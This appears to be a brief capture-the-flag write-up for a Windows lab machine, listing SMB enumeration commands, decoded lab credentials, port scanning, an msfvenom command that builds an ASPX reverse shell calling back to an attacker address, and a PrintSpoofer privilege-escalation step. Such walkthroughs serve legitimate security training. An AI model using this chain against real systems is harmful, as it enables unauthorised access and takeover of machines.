Find it is a windows box with rdp and smb


Find all the different folders

```
smbclient -L $IP
```

Look at the following and find a passwords.txt

```
smbclient \\\\$IP\\nt4wrksv 
```

The passwords fild says the passwords are encoded, so use cyber chef to find

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

None of this works and is a honey pot

use rustscan to find that there are more open ports and run gobuster against 49663

find you have write priviledge to the smb

exploit with a reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.28.132 LPORT=1234 -f aspx -o pwn.aspx
```

shows what we can do

```
whoami /priv
```

SeImpersonate privileges means we can do printspoof and get root
